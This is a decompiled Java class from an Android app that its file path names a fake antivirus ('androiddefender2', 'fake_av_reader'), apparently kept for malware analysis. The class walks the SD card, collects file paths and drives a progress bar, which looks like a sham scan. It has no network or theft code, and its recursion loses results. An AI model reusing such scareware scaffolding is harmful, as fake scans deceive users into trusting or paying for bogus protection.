package com.worker.androiddefender2;

import android.os.Environment;
import android.widget.ProgressBar;
import java.io.File;
import java.util.ArrayList;

public class FilesWorker {
  public static ArrayList<String> getListFilesSDCard(File paramFile, ProgressBar paramProgressBar) {
    ArrayList<String> arrayList = new ArrayList();
    File file = paramFile;
    if (paramFile == null)
      file = Environment.getExternalStorageDirectory(); 
    int i = (file.listFiles()).length;
    paramProgressBar.setProgress(0);
    File[] arrayOfFile = file.listFiles();
    int j = arrayOfFile.length;
    for (byte b = 0;; b++) {
      if (b < j) {
        paramFile = arrayOfFile[b];
        if (paramFile.isDirectory()) {
          if (paramFile.getAbsolutePath().endsWith(".android_secure"))
            return arrayList; 
          if (!paramFile.getAbsolutePath().endsWith("DCIM"))
            getListFilesSDCard(paramFile, paramProgressBar); 
        } else {
          arrayList.add(paramFile.getAbsolutePath());
          double d = i / 100.0D;
          paramProgressBar.setProgress((int)Math.ceil(arrayList.size() / d));
        } 
      } else {
        return arrayList;
      } 
    } 
  }
}


/* Location:              /home/fahim/Desktop/fake_av_reader-dex2jar.jar!/com/worker/androiddefender2/FilesWorker.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */